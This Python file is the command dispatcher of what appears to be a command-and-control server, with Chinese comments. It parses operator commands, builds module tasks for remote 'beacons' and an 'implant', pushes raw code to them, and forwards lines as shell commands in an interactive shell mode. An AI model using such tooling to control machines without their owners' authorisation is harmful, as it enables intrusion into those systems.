"""
server/engine/dispatcher.py — 命令引擎 (T3.1)

纯逻辑、无 I/O。命令入口收敛点：console 与 Client 通道（及未来 API）
共用同一个 execute()。每个会话一个 Dispatcher 实例（current_beacon 会话级，
互不干扰）。

命令 handler 签名: run(disp, args) -> str
  disp: Dispatcher 实例（暴露共享组件与当前会话状态）
  args: 已 shlex 拆分的参数列表

模块命令（ls / ps / ...）动态走模块管线；内置命令由 engine/commands/
扫描注册（每命令一模块，用户"能模块化的不留集成"原则）。
"""

import shlex
from dataclasses import dataclass
from typing import Callable, Optional

from server.core.log import get_logger
from server.task_queue import Task

logger = get_logger("dispatcher")

_HEX_ID_CHARS = set("0123456789abcdefABCDEF")


@dataclass
class CommandContext:
    """共享组件引用（server 级单例），注入给 Dispatcher。"""

    mgr: object                # ClientManager
    tq: object                 # TaskQueue
    logger: object             # EventWriter（事件文件，Q6）
    config: object             # ServerConfig
    modules: object            # ModuleLoader
    smods: object              # ServerModuleLoader
    on_exit: Optional[Callable] = None   # console exit → server.stop()


class Dispatcher:
    """命令分发器。每会话一个实例。"""

    def __init__(self, ctx: CommandContext):
        self.mgr = ctx.mgr
        self.tq = ctx.tq
        self.audit = ctx.logger
        self.config = ctx.config
        self.modules = ctx.modules
        self.smods = ctx.smods
        self.on_exit = ctx.on_exit
        self.current_beacon: str = ""
        self._handlers: dict[str, Callable] = {}
        self._register_builtins()

    # ── 注册 ──

    def _register_builtins(self) -> None:
        from server.engine import commands
        for name, fn in commands.load_commands().items():
            self._handlers[name] = fn

    def register(self, name: str, fn: Callable) -> None:
        """注册命令（供测试与扩展）。"""
        self._handlers[name] = fn

    def command_names(self) -> list:
        """已注册的内置命令名列表（UI 补全用）。"""
        return sorted(self._handlers)

    # ── 主入口 ──

    def execute(self, line: str) -> str:
        """执行一行命令文本，返回输出。"""
        line = line.strip()
        if not line:
            return ""
        try:
            parts = shlex.split(line)
        except ValueError:
            parts = line.split()
        if not parts:
            return ""

        cmd = parts[0].lower()
        args = parts[1:]

        # L12：raw 下发原样代码（含引号/空格）——shlex 拆分已剥掉引号，
        # 导致 print('x') 变成 print(x)。从原始行重新提取代码部分。
        if cmd == "raw" and line[:3].lower() == "raw":
            rest = line[3:].strip()
            if (len(parts) > 1 and len(parts[1]) == 16
                    and rest.startswith(parts[1])):
                # 显式 <bid>：剥出后放回 args[0] 供 resolve_beacon 消费
                args = [parts[1], rest[16:].strip()] if rest[16:].strip() \
                    else [parts[1]]
            else:
                args = [rest] if rest else []

        # 交互式 shell 模式（beacon 执行过 shell 模块）：
        # exit/break → 下发文本 "exit" 退出子 shell（不退出 console）
        # 非内置命令（模块命令/未知命令）→ 原样文本下发，作为 shell 命令执行
        if self._beacon_in_shell():
            if cmd in ("exit", "break"):
                return self._push_shell_command("exit")
            if cmd not in self._handlers:
                return self._push_shell_command(line)

        handler = self._handlers.get(cmd)
        if handler:
            return handler(self, args)

        # 模块命令（动态管线）
        if self.modules.get_module(cmd):
            return self._exec_module(cmd, args)

        return f"[!] unknown command or module: {cmd}"

    # ── 公共工具（命令模块使用） ──

    def resolve_beacon(self, args: list) -> tuple:
        """从参数解析 beacon_id（可选）。

        仅当首参是已注册的 16 字符 hex ID 时消费；否则用 current_beacon。
        Returns: (beacon_id | None, 剩余参数)
        """
        if not args:
            return self.current_beacon or None, []
        first = args[0]
        if (len(first) == 16
                and all(c in _HEX_ID_CHARS for c in first)
                and self.mgr.get_client(first)):
            return first, args[1:]
        return self.current_beacon or None, args

    def build_task(self, name: str, args: list,
                   platform: str = "") -> Optional[Task]:
        """构建模块任务（纯构建，不查 beacon 平台）。

        Args:
            name: 模块名
            args: 位置参数
            platform: 目标平台（broadcast 用 ""）

        Returns:
            Task；模块不存在返回 None

        Raises:
            ValueError: 参数个数不符 / 平台无实现 / 代码超限
        """
        mod = self.modules.get_module(name)
        if not mod:
            return None
        param_names = [p[0] for p in (mod.get("params") or [])
                       if isinstance(p, (list, tuple)) and p]
        # rest 参数（hint == "rest"）：吸收剩余全部参数（空格拼接），
        # 支持带空格的完整命令（如 exec cd c:\）
        rest_name = None
        for p in (mod.get("params") or []):
            if (isinstance(p, (list, tuple)) and len(p) >= 2
                    and isinstance(p[1], str) and p[1].startswith("rest")):
                rest_name = p[0]
        if rest_name:
            idx = param_names.index(rest_name)
            # rest 至少要收一个参数（idx >= len(args) 时 rest 为空）
            if idx >= len(args):
                missing = (param_names[len(args):idx + 1]
                           if len(args) < idx else [rest_name])
                raise ValueError(
                    f"module '{name}': 缺少参数 {', '.join(missing)}")
            kwargs = {}
            for i, pname in enumerate(param_names):
                if pname == rest_name:
                    kwargs[pname] = " ".join(args[i:])
                    break  # rest 吸收剩余全部，后续参数不填充
                elif i < len(args):
                    kwargs[pname] = args[i]
        else:
            if args and not param_names:
                raise ValueError(f"module '{name}' takes no arguments")
            if param_names and len(args) > len(param_names):
                raise ValueError(
                    f"module '{name}' expects at most {len(param_names)} "
                    f"arg(s), got {len(args)}")
            # 必需参数（hint 不含"默认/可选"）缺失 → 构建期报错
            # （避免静默构建缺参任务，implant 端才 TypeError）
            required = [
                p[0] for p in (mod.get("params") or [])
                if (isinstance(p, (list, tuple)) and p
                    and not (len(p) > 1 and isinstance(p[1], str)
                             and ("默认" in p[1] or "可选" in p[1])))
            ]
            if len(args) < len(required):
                raise ValueError(
                    f"module '{name}': 缺少必需参数 "
                    f"{', '.join(required[len(args):])}")
            kwargs = dict(zip(param_names, args)) if param_names else {}
        code = self.modules.build_task(name, platform=platform, **kwargs)
        task = Task(code=code)
        rp = mod.get("result_processor", "")
        if rp:
            task.result_processor = rp
        return task

    def build_task_for(self, client_id: str, name: str,
                       args: list) -> Optional[Task]:
        """按 beacon 平台构建模块任务（auto_commands / 模块命令共用）。"""
        rec = self.mgr.get_client(client_id)
        platform = rec.sys_platform if rec else ""
        return self.build_task(name, args, platform=platform)

    def push_task(self, client_id: str, task: Task) -> str:
        """入队并返回控制台消息；队列满返回错误消息。"""
        if not self.tq.push(client_id, task):
            return (f"[!] 任务队列已满 "
                    f"(max {self.config.max_tasks_per_client})")
        return (f"[+] 任务已入队: task_id={task.task_id[:8]}..., "
                f"Beacon={client_id}")

    # ── 交互式 shell 模式支持 ──

    def _beacon_in_shell(self) -> bool:
        """当前选中 beacon 是否处于交互式 shell 模式。"""
        if not self.current_beacon:
            return False
        rec = self.mgr.get_client(self.current_beacon)
        return bool(rec and getattr(rec, "is_shell", False))

    def _push_shell_command(self, line: str) -> str:
        """把一行文本作为 shell 命令下发到当前 beacon。"""
        if not self.current_beacon:
            return "[!] 未指定 Beacon (use <beacon_id>)"
        task = Task(code=line)
        return self.push_task(self.current_beacon, task)

    # ── 内部 ──

    def _exec_module(self, cmd: str, args: list) -> str:
        bid, rest = self.resolve_beacon(args)
        if not bid:
            return "[!] 未指定 Beacon (use <beacon_id>)"
        try:
            task = self.build_task_for(bid, cmd, rest)
        except ValueError as e:
            return f"[!] {e}"
        if task is None:
            return f"[!] unknown command or module: {cmd}"
        return self.push_task(bid, task)
